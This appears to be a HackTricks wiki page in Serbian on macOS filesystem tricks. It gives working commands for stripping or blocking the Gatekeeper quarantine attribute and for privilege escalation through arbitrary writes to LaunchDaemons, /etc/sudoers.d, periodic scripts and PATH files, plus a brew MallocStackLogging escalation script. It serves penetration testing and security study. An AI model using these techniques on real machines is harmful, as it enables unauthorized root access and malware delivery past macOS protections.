# macOS FS Trikovi

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Kombinacije POSIX dozvola

Dozvole u **direktorijumu**:

* **čitanje** - možete **izlistati** unose u direktorijumu
* **pisanje** - možete **brisati/pisati** **fajlove** u direktorijumu i možete **brisati prazne foldere**.
* Ali ne možete **brisati/modifikovati neprazne foldere** osim ako imate dozvole za pisanje nad njima.
* Ne možete modifikovati ime foldera osim ako ga posedujete.
* **izvršavanje** - dozvoljeno vam je **traverzovati** direktorijum - ako nemate ovu dozvolu, ne možete pristupiti bilo kojim fajlovima unutra, ili u bilo kojim poddirektorijumima.

### Opasne Kombinacije

**Kako prebrisati fajl/folder koji je u vlasništvu root-a**, ali:

* Jedan roditeljski **direktorijum vlasnik** u putanji je korisnik
* Jedan roditeljski **direktorijum vlasnik** u putanji je **grupa korisnika** sa **pristupom pisanju**
* Grupa korisnika ima **pristup pisanju** fajlu

Sa bilo kojom od prethodnih kombinacija, napadač bi mogao **ubaciti** simbolički ili tvrdi **link** na očekivanu putanju kako bi dobio privilegovano proizvoljno pisanje.

### Poseban slučaj Folder root R+X

Ako postoje fajlovi u **direktorijumu** gde **samo root ima R+X pristup**, ti fajlovi **nisu dostupni nikome drugom**. Dakle, ranjivost koja omogućava **pomeranje fajla koji je čitljiv za korisnika**, a koji ne može biti pročitan zbog te **restrikcije**, iz ovog foldera **u drugi**, može biti zloupotrebljena da bi se pročitali ti fajlovi.

Primer u: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Simbolički Link / Tvrdi Link

Ako privilegovani proces piše podatke u **fajl** koji bi mogao biti **kontrolisan** od strane **korisnika sa manje privilegija**, ili koji bi mogao biti **prethodno kreiran** od strane korisnika sa manje privilegija. Korisnik jednostavno može **usmeriti** na drugi fajl putem Simboličkog ili Tvrdog linka, i privilegovani proces će pisati na taj fajl.

Proverite u drugim sekcijama gde napadač može **zloupotrebiti proizvoljno pisanje da bi eskalirao privilegije**.

## .fileloc

Fajlovi sa ekstenzijom **`.fileloc`** mogu pokazivati na druge aplikacije ili binarne fajlove tako da kada se otvore, aplikacija/binarni fajl će biti izvršen.\
Primer:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Proizvoljni FD

Ako možete naterati **proces da otvori datoteku ili fasciklu sa visokim privilegijama**, možete zloupotrebiti **`crontab`** da otvori datoteku u `/etc/sudoers.d` sa **`EDITOR=exploit.py`**, tako da će `exploit.py` dobiti FD ka datoteci unutar `/etc/sudoers` i zloupotrebiti je.

Na primer: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Trikovi za izbegavanje xattrs karantina

### Uklonite ga
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable zastava

Ako datoteka/folder ima ovaj atribut nepromenljivosti, neće biti moguće staviti xattr na nju.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Montiranje defvfs

**Devfs** montiranje **ne podržava xattr**, više informacija na [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Ova ACL sprečava dodavanje `xattrs` datoteci.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** format datoteke kopira datoteku zajedno sa svojim ACE-ovima.

U [**izvornom kodu**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) moguće je videti da se ACL tekstualna reprezentacija čuva unutar xattr-a nazvanog **`com.apple.acl.text`** i postavlja se kao ACL u dekompresovanoj datoteci. Dakle, ako ste kompresovali aplikaciju u zip datoteku sa **AppleDouble** formatom datoteke sa ACL-om koji sprečava pisanje drugih xattr-ova u nju... karantinski xattr nije postavljen u aplikaciju:

Proverite [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) za više informacija.

Da biste replicirali ovo, prvo moramo dobiti tačan ACL string:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Notea da čak i ako ovo funkcioniše, sandbox upisuje karantinski xattr pre)

Nije baš potrebno, ali ostavljam to tamo samo u slučaju:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Zaobilaženje Koda Potpisa

Bundles sadrže datoteku **`_CodeSignature/CodeResources`** koja sadrži **hash** svake pojedinačne **datoteke** u **bundle**-u. Imajte na umu da je hash CodeResources-a takođe **ugrađen u izvršnu datoteku**, tako da s tim ne možemo manipulisati.

Međutim, postoje neke datoteke čji potpis neće biti proveren, one imaju ključ za izostavljanje u plist-u, kao što je:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Moguće je izračunati potpis resursa sa terminala pomoću:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montiranje dmg datoteka

Korisnik može montirati prilagođenu dmg datoteku čak i preko nekih postojećih fascikli. Evo kako možete kreirati prilagođeni dmg paket sa prilagođenim sadržajem:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

Obično macOS montira disk razgovarajući sa `com.apple.DiskArbitrarion.diskarbitrariond` Mach servisom (koji pruža `/usr/libexec/diskarbitrationd`). Ako dodate parametar `-d` u LaunchDaemons plist fajl i ponovo pokrenete, on će čuvati logove u `/var/log/diskarbitrationd.log`.\
Međutim, moguće je koristiti alate poput `hdik` i `hdiutil` da komunicirate direktno sa `com.apple.driver.DiskImages` kextom.

## Proizvoljni upisi

### Periodični sh skriptovi

Ako vaša skripta može biti tumačena kao **shell skripta** možete prebrisati **`/etc/periodic/daily/999.local`** shell skriptu koja će biti pokrenuta svakog dana.

Možete **falsifikovati** izvršenje ove skripte sa: **`sudo periodic daily`**

### Demoni

Napišite proizvoljni **LaunchDaemon** poput **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** sa plist-om koji izvršava proizvoljnu skriptu kao:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Sudoers File

Ako imate **proizvoljan zapis**, možete kreirati fajl unutar foldera **`/etc/sudoers.d/`** dodeljujući sebi **sudo** privilegije.

### PATH fajlovi

Fajl **`/etc/paths`** je jedno od glavnih mesta koje popunjava PATH env promenljivu. Morate biti root da biste ga prepisali, ali ako skripta iz **privilegovanog procesa** izvršava neku **komandu bez punog puta**, možda ćete moći da je **preuzmete** modifikujući ovaj fajl.

Takođe možete pisati fajlove u **`/etc/paths.d`** da učitate nove foldere u `PATH` env promenljivu.

## Generišite fajlove sa dozvolom pisanja kao drugi korisnici

Ovo će generisati fajl koji pripada root-u koji je moguće pisati od strane mene ([**kod odavde**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Ovo takođe može raditi kao privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Deljena memorija

**POSIX deljena memorija** omogućava procesima u operativnim sistemima koji su u skladu sa POSIX standardom da pristupe zajedničkom memorijskom prostoru, olakšavajući bržu komunikaciju u poređenju sa drugim metodama međuprocesne komunikacije. Uključuje kreiranje ili otvaranje objekta deljene memorije pomoću `shm_open()`, postavljanje njegove veličine pomoću `ftruncate()`, i mapiranje u prostor adresa procesa pomoću `mmap()`. Procesi mogu direktno čitati i pisati u ovaj memorijski prostor. Za upravljanje konkurentnim pristupom i sprečavanje korupcije podataka, često se koriste mehanizmi sinhronizacije poput meksičkih bravica ili semafora. Na kraju, procesi odjavljuju i zatvaraju deljenu memoriju pomoću `munmap()` i `close()`, i opciono uklanjaju objekat memorije pomoću `shm_unlink()`. Ovaj sistem je posebno efikasan za efikasnu, brzu IPC u okruženjima gde više procesa treba brzo pristupiti deljenim podacima.

<details>

<summary>Primer koda proizvođača</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Primer potrošačkog koda</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Čuvani deskriptori

**macOS čuvani deskriptori** su sigurnosna funkcija uvedena u macOS-u kako bi se poboljšala sigurnost i pouzdanost operacija sa **deskriptorima datoteka** u korisničkim aplikacijama. Ovi čuvani deskriptori pružaju način da se povežu određena ograničenja ili "čuvari" sa deskriptorima datoteka, koje sprovodi jezgro.

Ova funkcija je posebno korisna za sprečavanje određenih klasa sigurnosnih ranjivosti kao što su **neovlašćen pristup datotekama** ili **trke uslova**. Ove ranjivosti se javljaju kada na primer jedna nit pristupa deskripciji datoteke dajući **drugoj ranjivoj niti pristup nad njom** ili kada deskriptor datoteke **nasleđuje** ranjiv deteći proces. Neke funkcije povezane sa ovom funkcionalnošću su:

* `guarded_open_np`: Otvori FD sa čuvarom
* `guarded_close_np`: Zatvori ga
* `change_fdguard_np`: Promeni čuvarske zastave na deskriptoru (čak i uklanjanje zaštite čuvara)

## Reference

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
